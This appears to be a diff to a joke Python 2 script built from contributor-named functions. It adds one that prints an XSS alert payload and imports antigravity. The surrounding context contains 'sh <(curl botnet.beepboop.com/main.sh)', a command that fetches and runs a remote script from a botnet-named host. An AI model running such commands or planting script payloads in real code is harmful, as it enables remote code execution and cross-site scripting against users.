@@ -24,6 +24,7 @@ import math
 import sys
 import inspect
 import webbrowser
+import time
 
 def heinzf():
     """Compare itself with the raw code github. If there's something new, it updates the file localy."""
@@ -370,6 +371,13 @@ def doboy(doboy_):
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
+        
+def ngokevin(shamelessadvertising):
+    # I'm sleepy zzz.
+    time.sleep(5)
+    # Check for XSS.
+    print '<script>alert("HAHAHA");</script>'
+    import antigravity
 
 if __name__ == "__main__":
     heinzf() # this thing makes it hard to make sure stuff works, doesn't it?
@@ -414,6 +422,7 @@ if __name__ == "__main__":
     hazirguo()
     chris911()
     doboy(doboy)
+    ngokevin('ngokevin.com')
 
     # as per instructed, please leave this as the final function
     lafin()
